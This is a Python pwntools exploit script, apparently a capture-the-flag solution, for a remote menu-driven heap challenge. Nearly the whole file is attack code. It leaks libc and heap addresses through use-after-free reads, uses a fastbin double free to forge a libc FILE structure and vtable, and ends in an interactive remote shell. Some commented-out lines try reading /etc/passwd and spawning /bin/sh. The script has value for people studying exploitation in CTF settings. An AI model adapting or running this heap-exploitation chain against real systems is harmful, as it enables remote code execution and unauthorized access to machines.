from pwn import *

#s = remote('192.168.0.85',1234)
s = remote('128.199.85.217', 10001)
def alloc(size,dat):
  s.recvuntil('5. Run away')
  s.send('1\n')
  s.recvuntil('Length?')
  s.send(str(size)+'\n')
  s.send(dat)
def free(num):
  s.recvuntil('5. Run away')
  s.send('3\n')
  s.recvuntil('Num?')
  s.send(str(num)+'\n')
def read(num):
  s.recvuntil('5. Run away')
  s.send('4\n')
  s.recvuntil('Num?')
  s.send(str(num)+'\n')
def pray(dat):
  s.recvuntil('5. Run away')
  s.send('2\n')
  s.recvuntil('Where is Quran? ')
  s.send(dat)
raw_input()
#pray('/etc/passwd\n')
alloc(0x100,'1234')
alloc(0x100,'1234')
free(0)
read(0)

libc = u64(s.recvuntil('1')[-8:-2]+'\x00\x00') - 0x3c3b78
log.info('LIBC : 0x%x'%libc)
alloc(0x100,'1234')
alloc(0x50,'1234')
alloc(0x50,'1234')
free(3)
free(4)
read(4)
heap = u64(s.recvuntil('1')[-8:-2]+'\x00\x00')
log.info('HEAP : 0x%x'%heap)
alloc(0x68,'AAAA')
alloc(0x68,'BBBB')
free(5)
free(6)
free(5)
alloc(0x68,p64(libc+0x3c46b5+8)+p64(libc+0x45390))
alloc(0x68,'BB')
alloc(0x68,'A'*8)
dat = p64(0x6873)
dat += p64(0)
dat += p64(libc+0x3c46a3)*7
dat += p64(0)*4
dat += p64(libc+0x3c38e0)
dat += p64(1)
dat += p64(0xffffffffffffffff)
dat += p64(0x000000000a000000)
dat += p64(libc+0x3c5780)
dat += p64(0xffffffffffffffff)
dat += p64(0)
dat += p64(libc+0x3c37a0)
dat += p64(0)*3
dat += p64(0x00000000ffffffff)
dat += p64(0)*2
dat += p64(heap+0xd8-0x38)
dat += p64(libc+0x3c4540)
alloc(len(dat),dat)
alloc(0x68,'A'*0x3b+p64(heap+0x1b0))
#pray('/bin/sh\x00\n')
#alloc(0x0602420,'1234')
s.interactive()
